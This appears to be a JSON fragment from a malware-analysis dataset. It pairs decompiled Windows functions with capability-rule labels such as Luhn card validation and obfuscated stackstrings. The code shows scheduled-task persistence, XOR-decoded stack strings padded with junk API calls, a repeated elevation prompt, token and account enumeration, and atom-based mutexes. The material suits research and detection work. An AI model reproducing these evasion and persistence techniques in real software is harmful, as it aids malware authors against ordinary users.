        "decompiled_code": "\nuint __cdecl fcn.0040a653(uint noname_0, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint in_EDX;\n    uint uVar5;\n    uint var_90h;\n    uint var_80h;\n    uint var_70h;\n    uint var_60h;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint var_50h;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint var_40h;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *ppv;\n    \n    uVar5 = 0;\n    var_18h = 0;\n    var_1ch = in_EDX;\n    iVar2 = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 0);\n    if (-1 < iVar2) {\n        iVar2 = (*_sym.imp.ole32.dll_CoInitializeSecurity)(0, 0xffffffff, 0, 0, 6, 3, 0, 0, 0);\n        if (-1 < iVar2) {\n            ppv = NULL;\n            iVar2 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x4103b0, 0, 1, 0x4103a0, &ppv);\n            pcVar1 = _sym.imp.OLEAUT32.dll_VariantClear;\n            if (-1 < iVar2) {\n                (*_sym.imp.OLEAUT32.dll_VariantClear)(&var_60h);\n                (*pcVar1)(&var_50h);\n                (*pcVar1)(&var_40h);\n                (*pcVar1)(&var_30h);\n                iVar2 = (**(*ppv + 0x28))(ppv, var_30h, uStack48, uStack44, uStack40, var_40h, uStack64, uStack60, \n                                          uStack56, var_50h, uStack80, uStack76, uStack72, var_60h, uStack96, uStack92, \n                                          uStack88);\n                pcVar1 = _sym.imp.OLEAUT32.dll_VariantCopy;\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_30h);\n                (*pcVar1)(&var_40h);\n                (*pcVar1)(&var_50h);\n                (*pcVar1)(&var_60h);\n                pcVar1 = _sym.imp.OLEAUT32.dll_SysReAllocString;\n                if (-1 < iVar2) {\n                    iVar2 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(0x4109e4);\n                    if (iVar2 != 0) {\n                        var_10h = NULL;\n                        iVar3 = (**(*ppv + 0x1c))(ppv, iVar2, &var_10h);\n                        if (-1 < iVar3) {\n                            iVar3 = (*pcVar1)(var_8h);\n                            if (iVar3 != 0) {\n                                (**(*var_10h + 0x3c))(var_10h, iVar3, 0);\n                                var_ch = NULL;\n                                iVar4 = (**(*ppv + 0x24))(ppv, 0, &var_ch);\n                                if (-1 < iVar4) {\n                                    var_8h = NULL;\n                                    iVar4 = (**(*var_ch + 0x24))(var_ch, &var_8h);\n                                    if (-1 < iVar4) {\n                                        var_14h = NULL;\n                                        iVar4 = (**(*var_8h + 0x28))(var_8h, 9, &var_14h);\n                                        if (-1 < iVar4) {\n                                            iVar4 = fcn.0040a290(extraout_ECX);\n                                            if (iVar4 != 0) {\n                                                var_18h = fcn.0040a2e5(iVar3, var_1ch, arg_ch);\n                                            }\n                                            (**(*var_14h + 8))(var_14h);\n                                        }\n                                        (**(*var_8h + 8))(var_8h);\n                                    }\n                                    (**(*var_ch + 8))(var_ch);\n                                }\n                                (*_sym.imp.OLEAUT32.dll_SysStringLen)(iVar3);\n                            }\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(iVar2);\n                    }\n                }\n                (**(*ppv + 8))(ppv);\n                uVar5 = var_18h;\n            }\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return uVar5;\n}\n",
        "token_count": 1141
    },
    "0040a857": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040a857(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    uint var_70h;\n    uint var_6ch;\n    ushort var_68h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_50h;\n    uint var_4ch;\n    uint lpUniversalTime;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint lpSystemTime;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint lpLocalTime;\n    uint var_1ah;\n    uint uStack26;\n    ushort uStack22;\n    uint32_t lpSystemTimeAsFileTime;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = (**(*param_1 + 0xc))(param_1, &var_4h, &var_8h);\n    if (-1 < iVar1) {\n        lpSystemTimeAsFileTime = 0;\n        var_ch = 0;\n        (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&lpSystemTimeAsFileTime);\n        bVar4 = 0x4d2fa1ff < lpSystemTimeAsFileTime;\n        lpSystemTimeAsFileTime = lpSystemTimeAsFileTime + 3000000000;\n        var_ch = var_ch + bVar4;\n        puVar3 = &lpSystemTimeAsFileTime;\n        for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        puVar3 = &lpSystemTime;\n        for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(&lpSystemTimeAsFileTime, &lpSystemTime);\n        lpLocalTime._0_2_ = 0;\n        lpUniversalTime = lpSystemTime;\n        uStack64 = uStack48;\n        uStack60 = uStack44;\n        uStack56 = uStack40;\n        stack0xffffffde = 0;\n        var_1ah = 0;\n        uStack26 = 0;\n        uStack22 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_SystemTimeToTzSpecificLocalTime)(0, &lpUniversalTime, &lpLocalTime);\n        if (-1 < iVar1) {\n            puVar3 = &var_70h;\n            for (iVar1 = 0x30; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            var_6ch._0_2_ = lpLocalTime;\n            var_6ch._2_2_ = lpLocalTime._2_2_;\n            var_68h = var_1ah;\n            var_60h._0_2_ = var_1ah._2_2_;\n            var_60h._2_2_ = 0;\n            var_50h = 1;\n            var_4ch._0_2_ = 1;\n            var_58h = 1;\n            var_70h._0_2_ = 0x30;\n            var_5ch = 0x5a0;\n            iVar2 = (**(*var_8h + 0xc))(var_8h, &var_70h);\n            iVar1 = 0;\n            if (iVar2 < 0) {\n                iVar1 = iVar2;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 905
    },
    "0040abd2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040abd2(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint noname_0_00;\n    bool bVar3;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    bVar3 = false;\n    iVar1 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar1) {\n        iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x4103f0, 0, 1, 0x4103e0, &ppv);\n        if (iVar1 < 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x227, iVar1);\n            fcn.00401f6b(\"<%d>: TASK_SHEDULER.CPP:%d > TaskAddSch10 : CoCreateInstance failed: %x\", uVar2);\n        }\n        else {\n            iVar1 = (**(*ppv + 0x20))(ppv);\n            if (iVar1 < 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x220, iVar1);\n                fcn.00401f6b(\"<%d>: TASK_SHEDULER.CPP:%d > TaskAddSch10 : NewWorkItem failed: %x\", uVar2);\n            }\n            else {\n                iVar1 = fcn.0040a953(noname_0_00, arg_ch);\n                if (iVar1 != 0) {\n                    iVar1 = (**(*ppv + 0x24))(ppv);\n                    bVar3 = -1 < iVar1;\n                    if (bVar3) {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x214);\n                        fcn.00401f6b(\"<%d>: TASK_SHEDULER.CPP:%d > TaskAddSch10 : task created\", uVar2);\n                        (**(*var_4h + 0x30))(var_4h);\n                    }\n                    else {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x210, iVar1);\n                        fcn.00401f6b(\"<%d>: TASK_SHEDULER.CPP:%d > TaskAddSch10 : AddWorkItem failed: %x\", uVar2);\n                    }\n                }\n                (**(*var_4h + 8))(var_4h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return bVar3;\n}\n",
        "token_count": 581
    },
    "0040af8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040af8c(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint *var_94h;\n    uint *var_90h;\n    uint var_88h;\n    uint hObject;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t lpLibFileName;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint8_t var_24h [3];\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint32_t var_15h;\n    uint32_t var_11h;\n    uint var_dh;\n    uint var_9h;\n    uchar var_5h;\n    uint8_t *lpszLongPath;\n    \n    var_38h = 0x751e4b4c;\n    var_34h = 0x6925691f;\n    puVar9 = &lpDst;\n    for (iVar7 = 0x410; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_30h = 0x4b007611;\n    var_2ch = 0x6953751b;\n    puVar9 = &ARG_0;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_28h._0_2_ = 0x6917;\n    stack0xffffffd7 = 0x1a4b1076;\n    puVar9 = &ARG_0;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_21h = 0x2e690275;\n    var_1dh = 0x5a761869;\n    puVar9 = &lpszShortPath;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_64h = 6;\n    var_28h._2_1_ = 6;\n    var_19h = 0x2a755b4b;\n    var_15h = 0x18692869;\n    var_11h = 0x474b0d76;\n    var_dh = 0x33691375;\n    var_9h._0_1_ = 0x69;\n    var_9h._1_2_ = 0x7610;\n    var_9h._3_1_ = 0x69;\n    var_5h = 0x4b;\n    var_5ch = 0x75694b69;\n    var_58h._0_1_ = 0x76;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_60h = 5;\n    iVar8 = 0;\n    var_68h = iVar7;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar3 != 0x8c0a76) {\n            *(iVar8 + iVar7) = *(&var_5ch + iVar8 % var_60h) ^ (iVar8 + iVar7)[&var_38h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    stack0xffffffd7 = stack0xffffffd7 & 0xff | 0x42726400;\n    var_21h = 0x52442147;\n    var_1dh = 0x3742656d;\n    var_19h = 0x23471972;\n    var_15h = 0x336d0044;\n    var_11h = 0x48726442;\n    var_dh = 0x50443147;\n    var_9h._0_1_ = 0x6d;\n    var_9h._1_2_ = 0x4247;\n    var_54h = 0x476d7244;\n    var_50h._0_1_ = 0x42;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_5ch = iVar7;\n    lpszLongPath = var_24h + -iVar7;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar3 != 0xa6cbc2) {\n            *(iVar8 + iVar7) = *(&var_54h + iVar8 % var_60h) ^ (iVar8 + iVar7)[var_24h + -iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar7, &lpszShortPath);\n    var_44h = 0x6c333034;\n    var_40h = 0x46514623;\n    var_3ch = 0x30464d1f;\n    lpLibFileName = 0x6c463046;\n    puVar9 = &var_a4h;\n    for (iVar7 = 0x3c; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h._0_1_ = 0x4d;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_98h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_54h = var_98h;\n    lpszLongPath = &var_44h - var_98h;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar8 != 0x9ef53b) {\n            *(iVar7 + var_98h) = *(&lpLibFileName + iVar7 % var_60h) ^ (iVar7 + var_98h)[&var_44h - var_98h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    var_94h = &lpDst;\n    var_a4h = 0x3c;\n    var_90h = &ARG_0;\n    var_88h = 3;\n    var_a0h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_11h = var_11h & 0xff | 0x15712400;\n    var_dh = 0xb443f03;\n    var_9h._0_1_ = 0x7e;\n    var_9h._1_2_ = 0x1f2b;\n    var_9h._3_1_ = 0x1b;\n    var_5h = 0x39;\n    var_40h = 0x4f503977;\n    var_3ch = CONCAT31(var_3ch._1_3_, 0x73);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    iVar8 = &var_11h + (1 - iVar7);\n    lpLibFileName = iVar7;\n    lpszLongPath = iVar8;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar4 != 0x3d25d0) {\n            *(iVar3 + iVar7) = *(&var_40h + iVar3 % var_60h) ^ (iVar3 + iVar7)[iVar8];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0xc);\n    var_15h = var_15h & 0xff | 0x50221400;\n    var_11h = 0x3f72583f;\n    var_dh = 0x4026562f;\n    var_9h._0_1_ = 0x52;\n    var_9h._1_2_ = 0x3202;\n    var_9h._3_1_ = 0x62;\n    var_5h = 0x53;\n    var_40h = 0x53354a47;\n    var_3ch = CONCAT22(var_3ch._2_2_, 0x3734);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    iVar8 = &var_15h + (1 - iVar7);\n    lpszLongPath = iVar8;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetInputState)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0x4c9121) {\n            *(iVar3 + iVar7) = *(&var_40h + iVar3 % var_64h) ^ (iVar3 + iVar7)[iVar8];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    while( true ) {\n        var_9ch = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar8 = (*pcVar6)(&var_a4h);\n        if (iVar8 != 0) break;\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar8 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_54h);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_5ch);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_68h);\n    (*pcVar6)(uVar2);\n    return 1;\n}\n",
        "token_count": 2872
    },
    "0040b90f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040b90f(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint lpUrlComponents;\n    uint var_2ch;\n    uint var_28h;\n    \n    puVar4 = &lpUrlComponents;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 269
    },
    "0040d29a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040d29a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_410h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    uVar2 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    do {\n        if (0x3ff < uVar2) {\n            iVar1 = var_8h + uVar2;\n            puVar3 = &var_410h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            uVar2 = 0;\n            var_8h = iVar1;\n            param_1 = var_10h;\n        }\n        *(&var_410h + uVar2) = *(var_ch + param_1) ^ var_1h;\n        uVar2 = uVar2 + 1;\n        var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n        var_ch = var_ch + 1;\n    } while (var_ch < 0x184);\n    if (uVar2 != 0) {\n        puVar3 = &var_410h;\n        puVar4 = var_8h + param_1;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 499
    },
    "0040d68a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040d68a(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t hObject;\n    uint ARG_0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pSessionId;\n    uint *dwProcessId;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint dwBytes;\n    int32_t TokenHandle;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_24h = 0x104;\n    var_10h = puVar3;\n    uVar2 = (*pcVar6)(8, 0x208);\n    var_ch = (*pcVar7)(uVar2);\n    var_20h = 0x104;\n    var_1ch = 0;\n    dwBytes = 0;\n    pSessionId = 0;\n    uVar2 = 0;\n    if ((puVar3 != NULL) && (var_ch != NULL)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, dwProcessId);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (hObject != 0) {\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_ch;\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(hObject, 0x20008, &TokenHandle);\n            if ((iVar5 != 0) || (TokenHandle == 0)) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n                pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n                if (iVar5 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &dwBytes);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar5 == 0x7a) {\n                        uVar2 = (*pcVar6)(8, dwBytes);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (dwProcessId != NULL) {\n                            iVar5 = (*pcVar1)(TokenHandle, 1, dwProcessId, dwBytes, &dwBytes);\n                            if (iVar5 != 0) {\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_10h, &var_24h, var_ch, &var_20h, &var_30h);\n                                if (iVar5 != 0) {\n                                    var_60h = 0x42203034;\n                                    var_5ch = 0x30344f39;\n                                    var_58h = 0x4f25422c;\n                                    var_54h = 0x425f3029;\n                                    var_50h = 0x303b4f36;\n                                    var_4ch = 0x4f194240;\n                                    var_48h = 0x4240303b;\n                                    var_44h = 0x303b4f19;\n                                    var_40h = 0x4f0e4240;\n                                    var_3ch._0_2_ = 0x3067;\n                                    var_38h = 0x42653067;\n                                    var_34h._0_2_ = 0x4f6a;\n                                    uVar2 = (*pcVar6)(8, 0x4d);\n                                    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                    iVar8 = 0;\n                                    do {\n                                        iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                                        if (iVar4 != 0xca629e) {\n                                            var_1ch = 6;\n                                            *(iVar8 + iVar5) =\n                                                 *(&var_38h + iVar8 % 6) ^ (iVar8 + iVar5)[&var_60h - iVar5];\n                                        }\n                                        iVar8 = iVar8 + 1;\n                                    } while (iVar8 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar5, var_ch, var_10h, pSessionId);\n                                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_1ch = 1;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                            }\n                            uVar2 = (*pcVar6)(0, dwProcessId);\n                            (*pcVar7)(uVar2);\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            puVar3 = var_10h;\n        }\n        uVar2 = (*pcVar6)(0, var_ch);\n        (*pcVar7)(uVar2);\n        uVar2 = (*pcVar6)(0, puVar3);\n        (*pcVar7)(uVar2);\n        uVar2 = var_1ch;\n    }\n    return uVar2;\n}\n",
        "token_count": 1512
    },
    "0040d8dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040d8dc(uint param_1)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint lpString;\n    uint lpExitTime;\n    uint lpKernelTime;\n    uint lpUserTime;\n    uint lpCreationTime;\n    uint var_2ch;\n    int32_t hObject;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = 0;\n    iVar6 = 8;\n    puVar7 = &lpCreationTime;\n    var_20h = param_1;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_24h = 0;\n    puVar7 = &lpExitTime;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpKernelTime;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpUserTime;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (hObject != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetProcessTimes)\n                          (hObject, &lpCreationTime, &lpExitTime, &lpKernelTime, &lpUserTime);\n        if (iVar4 != 0) {\n            var_18h = 0x726f3d10;\n            var_14h = 0x6f210d67;\n            var_10h = 0x210d6772;\n            var_ch._0_1_ = 0x42;\n            var_8h = 0x57425935;\n            var_4h._0_1_ = 0x57;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar6 = 0;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetCursor)();\n                if (iVar3 != 0xf1e1ed) {\n                    var_1ch = 5;\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(&lpString, iVar4, var_20h, var_2ch, lpCreationTime);\n            iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomA)(&lpString);\n            uVar5 = var_24h;\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)(&lpString);\n                if (iVar1 == 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(&lpString);\n                    (*_sym.imp.KERNEL32.dll_AddAtomA)(&lpString);\n                    uVar5 = 1;\n                }\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return uVar5 ^ 1;\n}\n",
